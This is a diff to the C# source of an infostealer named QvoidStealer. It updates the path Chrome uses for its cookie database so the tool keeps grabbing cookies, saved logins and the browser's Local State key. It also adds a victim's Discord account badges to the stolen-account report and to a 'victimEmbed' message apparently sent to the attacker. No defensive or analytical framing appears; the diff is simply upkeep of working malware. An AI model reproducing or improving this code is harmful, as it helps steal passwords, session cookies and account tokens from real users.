@@ -243,7 +243,7 @@ namespace QvoidStealer.Main
 
                 //Grabbing passwords and cookies
                 var _Chrome = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
-                    "\\Google\\Chrome\\User Data\\Default\\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
+                    "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                     "\\Google\\Chrome\\User Data\\Local State", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                     "\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome");
 
@@ -333,6 +333,7 @@ namespace QvoidStealer.Main
                                       $"Phone Number: {(String.IsNullOrEmpty(curUser.Phone) ? "None" : curUser.Phone)}{Environment.NewLine}" +
                                       $"Premium: {curUser.Premium}{Environment.NewLine}" +
                                       $"Verified: {curUser.Verified}{Environment.NewLine}" +
+                                      $"Badges: {string.Join(", ", curUser.GetBadges)}{Environment.NewLine}" +
                                       $"Created At: {curUser.CreatedAt.DateTime.ToShortDateString()} | {curUser.CreatedAt.DateTime.ToShortTimeString()}{Environment.NewLine}";
 
                     if (_Token == curUser.Token)
@@ -348,6 +349,7 @@ namespace QvoidStealer.Main
                         victimEmbed.Fields.Add(new EmbedField() { Name = "Verified", Value = $"```{curUser.Verified}```", InLine = true });
                         victimEmbed.Fields.Add(new EmbedField() { Name = "Created At", Value = $"```{curUser.CreatedAt}```", InLine = true });
                         victimEmbed.Fields.Add(new EmbedField() { Name = "Phone Number", Value = $"```{(String.IsNullOrEmpty(curUser.Phone) ? "None" : curUser.Phone)}{Environment.NewLine}```", InLine = true });
+                        victimEmbed.Fields.Add(new EmbedField() { Name = "Badges", Value = $"```{(curUser.GetBadges.Count <= 0 ? "None" : string.Join(", ", curUser.GetBadges))}{Environment.NewLine}```", InLine = true });
 
                         if (!String.IsNullOrEmpty(_OldPassword))
                         {
